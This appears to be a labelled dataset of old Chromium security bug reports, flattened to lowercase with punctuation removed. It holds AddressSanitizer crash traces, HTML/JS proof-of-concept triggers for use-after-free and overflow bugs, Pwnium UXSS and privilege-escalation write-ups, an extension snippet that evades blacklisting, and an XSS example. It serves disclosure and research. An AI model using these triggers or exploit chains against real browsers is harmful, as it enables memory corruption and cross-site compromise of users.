heap-use-after-free in webcore rendertablesection nodeatpoint vulnerability details use after free version chrome version stable beta dev chromium 19.0.1042.0 developer build 121877 os linux webkit 535.21 107663 operating system 64bit linux reproduction case the repro requires the mouse to be positioned over the page when it is being loaded d html head style el0 display table-cell content counter c counter-reset c width 1000px height 1000px el0 after content counter c counter-reset c el1 webkit-flow-into a el1 before content counter c counter-reset c style script function crash el0 document.createelement div el0.setattribute id el0 document.body.appendchild el0 el1 document.createelement div el1.setattribute id el1 el0.appendchild el1 document.body.offsettop document.body.style.zoom=2 window.onload=crash script head body body html for crashes please include the following additional information type of crash tab asan crash state 10096 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore rendertablesection nodeatpoint webcore hittestrequest const webcore hittestresult webcore intpoint const webcore intpoint const webcore hittestaction 0 is located 0 bytes inside of 200-byte region freed by thread t0 here 0 in free 0 1 in webcore node detach 0 2 in webcore element detach 0 3 in webcore element recalcstyle webcore node stylechange 0 4 in webcore element recalcstyle webcore node stylechange 0 this is in there which might explain the mouse interaction 12 in webcore document preparemouseevent webcore hittestrequest const webcore intpoint const webcore platformmouseevent const 0 13 in webcore eventhandler handlemousemoveevent webcore platformmouseevent const webcore hittestresult bool 0 14 in webcore eventhandler mousemoved webcore platformmouseevent const 0 15 in webkit webviewimpl mousemove webkit webmouseevent const 0	11
heap-use-after-free in webcore renderbox enclosingfloatpaintinglayer vulnerability details c 17 from issue 105458 version chrome version chromium 19.0.1051.0 developer build 123410 os linux webkit 535.22 108661 javascript v8 3.9.9 operating system linux with bits of 64 reproduction case html head style el1 before content a el3 before content a float right style script function crash el1 document.createelement div el1.setattribute id el1 document.body.appendchild el1 el3 document.createelement span el3.setattribute id el3 el1.appendchild el3 el4 document.createelement div el1.appendchild el4 el4.appendchild document.createelement div el1.style.display='-webkit-flexbox document.body.offsettop el3.style.display='-webkit-flexbox window.onload=crash script head body body html for crashes please include the following additional information type of crash asan tab crash state 17744 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in webcore renderbox enclosingfloatpaintinglayer const 0 1 in webcore renderblock addoverhangingfloats webcore renderblock bool 0 2 in webcore renderblock layoutblockchild webcore renderbox webcore renderblock margininfo int int 0 is located 48 bytes inside of 184-byte region freed by thread t0 here 0 in free 0 1 in webcore renderobjectchildlist destroyleftoverchildren 0 2 in webcore renderinline willbedestroyed 0 3 in webcore renderobject destroy 0	11
heap-buffer-overflow in webcore svgdocumentextensions removeanimationelementfromtarget vulnerability details heap buffer overflow occurs when removing animation element from document version version 19.0.1050.0 123195 developer build on ubuntu 10.10 17.0.963.56 m win7 x64 reproduction case in attachment for crashes please include the following additional information 2709 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 8 at thread t0 0 in wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement remove webcore svgsmilelement const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/hashtable.h:826 1 in webcore svgsmilelement svgsmilelement media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/animation/svgsmilelement.cpp:146 2 in webcore svgsetelement svgsetelement media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgsetelement.h:30 3 in void webcore removeallchildrenincontainer webcore node webcore containernode webcore containernode media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernodealgorithms.h:51 4 in containernode media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:110 5 in webcore svgelement svgelement media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgelement.cpp:89 6 in non-virtual thunk to webcore svgsvgelement svgsvgelement media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgsvgelement.cpp:103 7 in v8 internal runtimeprofiler isenabled media/chromium/chromium/depot_tools/src/v8/src/runtime-profiler.h:50 is located 8 bytes to the right of 1024-byte region allocated by thread t0 here 0 in malloc 0 1 in wtf fastmalloc unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/fastmalloc.cpp:268 2 in wtf hashtable webcore svgelement std pair webcore svgelement wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement wtf pairfirstextractor std pair webcore svgelement wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement wtf ptrhash webcore svgelement wtf pairhashtraits wtf hashtraits webcore svgelement wtf hashtraits wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement wtf hashtraits webcore svgelement rehash int media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/hashtable.h:965 3 in std pair wtf hashtableiterator webcore svgelement std pair webcore svgelement wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement wtf pairfirstextractor std pair webcore svgelement wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement wtf ptrhash webcore svgelement wtf pairhashtraits wtf hashtraits webcore svgelement wtf hashtraits wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement wtf hashtraits webcore svgelement bool wtf hashtable webcore svgelement std pair webcore svgelement wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement wtf pairfirstextractor std pair webcore svgelement wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement wtf ptrhash webcore svgelement wtf pairhashtraits wtf hashtraits webcore svgelement wtf hashtraits wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement wtf hashtraits webcore svgelement add wtf hashmaptranslator wtf pairhashtraits wtf hashtraits webcore svgelement wtf hashtraits wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement wtf ptrhash webcore svgelement webcore svgelement wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement webcore svgelement const wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/hashtable.h:674 4 in wtf hashmap webcore svgelement wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement wtf ptrhash webcore svgelement wtf hashtraits webcore svgelement wtf hashtraits wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement inlineadd webcore svgelement const wtf hashset webcore svgsmilelement wtf ptrhash webcore svgsmilelement wtf hashtraits webcore svgsmilelement const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/hashmap.h:325 5 in webcore svgsmilelement targetelement media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/animation/svgsmilelement.cpp:527 6 in webcore smiltimecontainer updateanimations webcore smiltime media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/animation/smiltimecontainer.cpp:249 7 in webcore smiltimecontainer begin media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/animation/smiltimecontainer.cpp:97 8 in webcore svgdocumentextensions startanimations media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgdocumentextensions.cpp:103 9 in webcore document implicitclose media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:2361 10 in webcore frameloader checkcompleted media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:796 11 in webcore frameloader finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:678 12 in webcore frame page const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frame.h:346 13 in webcore documentwriter endifnotloadingmainresource media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentwriter.cpp:233 14 in webcore resourceerrorbase isnull const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/network/resourceerrorbase.h:42 15 in webcore mainresourceloader didfinishloading double media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:485 16 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/webkit/glue/weburlloader_impl.cc:659 17 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:489 18 in void dispatchtomethod resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const int net urlrequeststatus std basic_string char std char_traits char std allocator char base timeticks resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const tuple4 int net urlrequeststatus std basic_string char std char_traits char std allocator char base timeticks const media/chromium/chromium/depot_tools/src/./base/tuple.h:566 19 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:559 20 in resourcedispatcher onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:326 21 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:171 22 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:268 23 in base callback void run const media/chromium/chromium/depot_tools/src/./base/callback.h:272 2709 aborting stats 27m malloced 25m for red zones by 52703 calls stats 0m realloced by 1151 calls stats 24m freed by 41242 calls stats 0m really freed by 0 calls stats 84m 21518 full pages mmaped in 21 calls mmaps by size class 8:49149 9:8191 10:8190 11:2047 12:1024 13:1536 14:256 15:256 16:64 17:32 18:16 19:8 20:4 22:2 mallocs by size class 8:40104 9:5891 10:3894 11:1156 12:282 13:1049 14:127 15:132 16:21 17:31 18:10 19:2 20:2 22:2 frees by size class 8:30131 9:5257 10:3509 11:851 12:197 13:1014 14:111 15:125 16:14 17:17 18:10 19:2 20:2 22:2 rfrees by size class stats malloc large 47 small slow 298 shadow byte and word fa fa fa fa fa fa fa fa fa more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa	11
heap-buffer-overflow in wk_png_inflate chrome version 17.0.963.56 os version urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 5 firefox 4.x ie 7/8/9 what steps will reproduce the problem 1.visit 2.visit each page 3.wait what is the expected result hang for a few seconds then reject the chunk and display the image the original bad.png wo n't fail because that was the subject of your recent bugfix and the scal-related one probably wo n't fail unless you have disabled floating point support and enabled fixed point support in libpng what happens instead some will give the chrome oh smap page and others just hang with the throbber chasing its tail please provide any additional information below attach a screenshot if possible the png images contain compressed ancillary chunks that expand to 3 or 4 gigabytes in the file names 3g or 4g indicates which the 3g ones are simply large while the 4g ones may trigger a 32-bit integer overflow similar to the earlier bug with the iccp chunk useragentstring mozilla/5.0 x11 linux x86_64 applewebkit/535.11 khtml like gecko chrome/17.0.963.56 safari/535.11 these bugs have been publicly fixed recently in the latest libpng beta distributions we discovered them in the process of fixing the recent bug with iccp that was revealed to the libpng group on february 15 roughly simultaneous with your revealing it publicly chunks that you know you will never use should be listed in a png_set_keep_unknown_chunks call with the property png_handle_chunk_never as demonstrated in libpng s contrib/gregbook/readpng2.c which will prevent the listed chunks from being processed mozilla uses this method to skip ztxt itxt and other chunks that it does n't use and has consequently not been affected by most of the cves involving libpng in recent years you can prevent dos by large ztxt etc chunks by setting limits on the amount of expansion allowed mozilla for example sets a limit of 4mb on the maximum size of an iccp chunk after decompression the method of setting the maximum varies with libpng version although if you are building a special-purpose embedded libpng you can just set png_user_chunk_malloc_max to a number like 4000000	7
part 1 of pwnium bug uxss 1 uxss using iframe elements when the src attribute of an iframe element is set to a javascript uri a security check is performed this check uses a stack of js contexts and is considered to be passed when there is no js context on the stack i.e when the dom tree is modified by native code an attacker can force the xml parser to insert the iframe element into the document tree by intercepting mutation events during generation of an xml parsing error message see uxss.svg and xmlerrors.cpp the bug requires an iframe to be attached to a frame object with a vicim page loaded while the iframe itself is not inserted into the tree this also can be achieved with setting the proper mutation event handler see uxss.html	9
part 2 of pwnium bug history navigation allows crossing privileged process boundary a privileged page e.g web store or a chrome page which has at least one subframe can be abused to run arbitrary js code inside the privileged process an attacker loads the page in a regular renderer process then modifies the subframe s location to his own uri and performs a navigation request to data text/html script history.back script since the most chrome pages are protected with csp the above uxss does n't work for them to make a subframe navigation request restricted by sop one can use a js context attached to the same frame and obtained at the time the pages had the same origin for the chrome scheme navigation the exploit abuses chrome chromewebdata the page that is displayed as a result of a load error	9
pwnium bug prerendering issues with nacl need to commit to trunk and m18	11
pwnium bug gpu memory corruption cl is landed to 963 still needs to hit trunk m18 etc	11
security malicious extension could avoid being blacklisted via extension blacklist this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details please provide a brief explanation of the security issue webrequest.onbeforerequest can intercept calls to thus if an extension went rogue google could add the extension to the blacklist but the extension could prevent chrome from receiving the blacklist update if this blacklist is for buggy extensions rather than malicious extensions then this is not a security bug version chrome version 17.0.963.12 dev-m operating system any reproduction case please include a demonstration of the security bug such as an attached html or binary file that reproduces the bug when loaded in chrome please make the file as small as possible and remove any content not required to demonstrate the bug put this in a background script in an extension chrome.webrequest.onbeforerequest.addlistener function details var block details.url.indexof blacklist 1 console.log details.url block return cancel block urls blocking and you should see true appear in the background console logs for crashes please include the following additional information type of crash tab browser etc crash state see link above stack trace registers exception record client id if relevant see link above	2
heap-use-after-free in webcore inlinebox root vulnerability details 6447 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore inlinebox root 0 1 in webcore rendertext setselectionstate webcore renderobject selectionstate 0 version chrome version stable beta dev chromium 19.0.1040.0 developer build 121661 os linux webkit 535.21 107445 operating system linux 64bit reproduction case html head style el1 first-letter display block style script onload function el0=document.createelement div document.body.appendchild el0 el1=document.createelement div el1.setattribute id el1 el1.appendchild document.createtextnode aaa el1.style.display='inline-block el0.appendchild el1 el0.appendchild document.createtextnode a document.execcommand selectall settimeout function document.stylesheets 0 insertrule el1 text-transform capitalize 0 script head body body html for crashes please include the following additional information type of crash renderer asan crash state 6447 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore inlinebox root 0 1 in webcore rendertext setselectionstate webcore renderobject selectionstate 0 is located 24 bytes inside of 152-byte region freed by thread t0 here 0 in free 0 1 in webcore renderlineboxlist deletelineboxes webcore renderarena 0 2 in webcore renderblock layoutinlinechildren bool int int 0 3 in webcore renderblock layoutblock bool int webcore renderblock blocklayoutpass 0	11
heap-use-after-free in webcore csscrossfadevalue csscrossfadevalue vulnerability details use-after-free can be triggered when using css function cross-fade during page reload version version 19.0.1050.0 123195 developer build on ubuntu 10.10 17.0.963.56 m win7 x64 reproduction case in attachment note it makes no sense which image is loaded it just must be present also location.reload is used only in purpose to automate test-case for crashes please include the following additional information 2973 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore csscrossfadevalue csscrossfadevalue media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/csscrossfadevalue.cpp:80 1 in webcore cssvalue destroy media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssvalue.cpp:205 2 in wtf vectordestructor true webcore cssproperty destruct webcore cssproperty webcore cssproperty media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/vector.h:57 3 in wtf refcounted webcore stylepropertyset operator delete void media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:178 4 in webcore cssrule destroy media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssrule.cpp:86 5 in wtf vectordestructor true wtf refptr webcore cssrule destruct wtf refptr webcore cssrule wtf refptr webcore cssrule media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/vector.h:57 6 in wtf refcounted webcore stylesheet operator delete void media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:178 7 in wtf vectordestructor true wtf refptr webcore stylesheet destruct wtf refptr webcore stylesheet wtf refptr webcore stylesheet media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/vector.h:57 8 in wtf refcounted webcore stylesheetlist operator delete void media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:178 9 in htmldocument media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/cache/cachedresourceclient.h:35 10 in v8 internal runtimeprofiler isenabled media/chromium/chromium/depot_tools/src/v8/src/runtime-profiler.h:50 is located 0 bytes inside of 1112-byte region freed by thread t0 here 0 in free 0 1 in webcore cachedresource unregisterhandle webcore cachedresourcehandlebase media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/cache/cachedresource.cpp:617 2 in cachedresourcehandle media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/cache/cachedresourcehandle.h:35 3 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/webkit/glue/weburlloader_impl.cc:659 4 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:489 5 in void dispatchtomethod resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const int net urlrequeststatus std basic_string char std char_traits char std allocator char base timeticks resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const tuple4 int net urlrequeststatus std basic_string char std char_traits char std allocator char base timeticks const media/chromium/chromium/depot_tools/src/./base/tuple.h:566 6 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:559 7 in resourcedispatcher onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:326 8 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:171 9 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:268 10 in base callback void run const media/chromium/chromium/depot_tools/src/./base/callback.h:272 11 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 12 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:660 13 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 14 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 15 in autorunstate media/chromium/chromium/depot_tools/src/base/message_loop.cc:745 16 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 17 in runzygote media/chromium/chromium/depot_tools/src/content/app/content_main_runner.cc:234 18 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:35 19 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 20 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 21 in 0 previously allocated by thread t0 here 0 in malloc 0 1 in wtf fastmalloc unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/fastmalloc.cpp:268 2 in webcore cachedresource operator new unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/cache/cachedresource.h:57 3 in webcore cachedresourceloader revalidateresource webcore cachedresource webcore resourceloadpriority webcore resourceloaderoptions const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/cache/cachedresourceloader.cpp:458 4 in webcore cachedresourceloader requestresource webcore cachedresource type webcore resourcerequest wtf string const webcore resourceloaderoptions const webcore resourceloadpriority bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/cache/cachedresourceloader.cpp:431 5 in webcore cachedresourceloader requestimage webcore resourcerequest media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/cache/cachedresourceloader.cpp:160 6 in webcore cssimagevalue cachedimage webcore cachedresourceloader wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssimagevalue.cpp:90 7 in webcore cssimagevalue cachedimage webcore cachedresourceloader media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssimagevalue.cpp:79 8 in wtf refptr webcore cssvalue get const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/csscrossfadevalue.cpp:59 9 in passrefptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:60 10 in wtf refptr webcore styleimage operator wtf passrefptr webcore styleimage const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:141 11 in webcore cssstyleselector applymatchedproperties webcore cssstyleselector matchresult const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssstyleselector.cpp:2747 12 in webcore cssstyleselector styleforelement webcore element webcore renderstyle bool bool webcore renderregion media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssstyleselector.cpp:1557 13 in webcore element styleforrenderer media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1021 14 in wtf refptr webcore renderstyle operator wtf passrefptr webcore renderstyle const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:141 15 in noderendererfactory media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/noderenderingcontext.h:112 16 in webcore node getflag webcore node nodeflags const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:697 17 in webcore node renderer const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:478 18 in webcore executetask webcore htmlconstructionsitetask media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmlconstructionsite.cpp:101 19 in webcore htmlconstructionsite executequeuedtasks media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmlconstructionsite.cpp:139 20 in webcore htmltreebuilder constructtreefromtoken webcore htmltoken media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmltreebuilder.cpp:459 21 in webcore htmldocumentparser pumptokenizer webcore htmldocumentparser synchronousmode media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:263 22 in webcore htmldocumentparser append webcore segmentedstring const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:372 23 in deque media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/deque.h:370 2973 aborting stats 56m malloced 46m for red zones by 97035 calls stats 3m realloced by 3770 calls stats 53m freed by 86486 calls stats 0m really freed by 0 calls stats 128m 32790 full pages mmaped in 32 calls mmaps by size class 8:81915 9:16382 10:8190 11:2047 12:1024 13:2048 14:256 15:384 16:64 17:64 18:16 19:8 20:8 22:6 mallocs by size class 8:75686 9:11763 10:5278 11:1462 12:543 13:1732 14:190 15:277 16:26 17:46 18:16 19:4 20:6 22:6 frees by size class 8:66363 9:11191 10:5020 11:1207 12:467 13:1710 14:175 15:270 16:19 17:32 18:16 19:4 20:6 22:6 rfrees by size class stats malloc large 78 small slow 503 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd	11
renderer process crash when doing webgl canvas to 2d canvas drawimage version 17 including tot os win7 x64 os x 10.7 untested on linux what steps will reproduce the problem 1 visit 2 click ui wait for the panel to appear 3 click capture 4 move the mouse over the preview in the bottom right you should get an aw snap 5 if no aw snap occurs click on the preview in the bottom right to pop up a new window this will likely aw snap and future page reloads will aw snap on step 4 what is the expected output what do you see instead no tab crashes	11
heap-use-after-free in webcore renderblock splitblocks vulnerability details use-after-free in webcore renderblock splitblocks version chrome version dev channel chromium 19.0.1060.0 developer build 124888 os linux webkit 536.2 109636 operating system 64bit ubuntu reproduction case html head style el0 webkit-column-count 2 el1 after display block content el2 nth-last-child 2n content el2 webkit-column-span all el4 float right style script onload function el0 document.createelement div el0.setattribute id el0 document.body.appendchild el0 el1 document.createelement div el1.setattribute id el1 el0.appendchild el1 el2 document.createelement div el2.setattribute id el2 el1.appendchild el2 el3 document.createelement span el1.appendchild el3 el3.appendchild document.createtextnode a el4 document.createelement table el4.setattribute id el4 el1.appendchild el4 el0.style.display='run-in el4.style.display='table-column document.body.offsettop document.designmode='on document.execcommand selectall document.execcommand inserttext script head body body html for crashes please include the following additional information type of crash renderer asan crash state 15675 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore renderblock splitblocks webcore renderblock webcore renderblock webcore renderblock webcore renderobject webcore renderboxmodelobject 0 1 in webcore renderblock splitflow webcore renderobject webcore renderblock webcore renderobject webcore renderboxmodelobject 0 is located 40 bytes inside of 184-byte region freed by thread t0 here 0 in free 0 1 in webcore renderblock removechild webcore renderobject 0 2 in webcore renderobject willbedestroyed 0	11
security do n't grant webui bindings to a process shared with normal views issue 117230 showed a case that renderviewhost allowbindings is granting webui bindings to a newly created renderviewhost that happens to share a process with normal web views this escalates their privileges in an unsafe way we should avoid granting privileges if the process has already been shared with normal web views	2
no permission prompt when loading unpacked extension with npapi plugin as part of the recent pinkiepie pwnium exploit it appears that the attacker was able to gain access to the extensions management page and get it to load an unpacked extension with an npapi plugin see also bug 117715 without generating a prompt looking at the code in unpackedinstaller onloaded it looks like it should generate a prompt in all cases unless the extension is disabled it s unclear to me from reading the code if re-enabling the extension would still trigger the prompt but my guess is that it does n't	2
langfuzz crash on heap with invalid read through getpropertywithcallback vulnerability details the javascript code below crashes chromium 19.0.1061.1 dev and likely chrome 17+18 and d8 shells tested trunk 3.7 and 3.8 branches on the heap with an invalid read version chrome version 19.0.1061.1 dev operating system ubuntu 11.10 64 bit i also tested d8 shells of branches 3.7 and 3.8 and they fail the same way so i assume that chrome versions 17+18 are affected as well reproduction case print function function constructor function asserthasownproperties object limit for var i 0 i limit i try object.keys catch exc2 print exc2.stack var x1 new object try new function a man called horse x1.d catch exc3 print exc3.stack try true toprecision lib1-f1 catch exc1 print exc1.stack for crashes please include the following additional information type of crash tab crash state program received signal sigsegv segmentation fault in gdb bt 8 0 in 1 in 2 in 3 in 4 in 5 in 6 in 7 in more stack frames follow gdb x 2i pc cmp r10 rax jne gdb info register r10 rax r10 48890600542449 rax 4294967296 gdb trace from d8 with valgrind 28819 invalid read of size 8 28819 at 28819 by 28819 by 28819 by 28819 by 28819 by 28819 by 28819 by 28819 by v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool in scratch/holler/langfuzz/v8-trunk/d8 28819 by v8 internal execution call v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object bool bool in scratch/holler/langfuzz/v8-trunk/d8 28819 by v8 internal object getpropertywithdefinedgetter v8 internal object v8 internal jsreceiver in scratch/holler/langfuzz/v8-trunk/d8 28819 by v8 internal jsobject getpropertywithcallback v8 internal object v8 internal object v8 internal string in scratch/holler/langfuzz/v8-trunk/d8 28819 address is not stack d malloc d or recently free d	9
potential xss attack with in euc-jp page vulnerability details google chrome treats as in euc-jp page this means that even though the developer takes correct xss protection xss occurs ex script var x xxx lt gt script script var x alert 1 script version chrome version 16.0.912.75 stable operating system windows vista sp2	9
heap-buffer-overflow in webcore font codepath vulnerability details heap buffer overflow happens when drawing text in svg version 18.0.1024.0 developer build 119669 linux does not reproduce on 16.0.912.77 m win7 x64 reproduction case script function go q document.getelementbyid root contentdocument r document.createrange r.selectnodecontents q.getelementbyid t window.getselection addrange r document.designmode='on q.execcommand delete q.execcommand delete script object data t.svg id root onload go object t.svg svg xmlns xmlns xlink g rect filter url x text 2 text rect id t style style text 2 text g filter id x filter svg for crashes please include the following additional information 7067 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 2 at thread t0 0 in webcore font codepath webcore textrun const const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/graphics/textrun.h:99 1 in webcore font drawtext webcore graphicscontext webcore textrun const webcore floatpoint const int int const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/graphics/font.cpp:159 2 in webcore inlinebox parent const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/inlinebox.h:209 3 in webcore svginlinetextbox painttext webcore graphicscontext webcore renderstyle webcore renderstyle webcore svgtextfragment const bool bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/svg/svginlinetextbox.cpp:675 4 in webcore svginlinetextbox paint webcore paintinfo webcore intpoint const int int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/svg/svginlinetextbox.cpp:312 5 in webcore inlinebox nextonline const 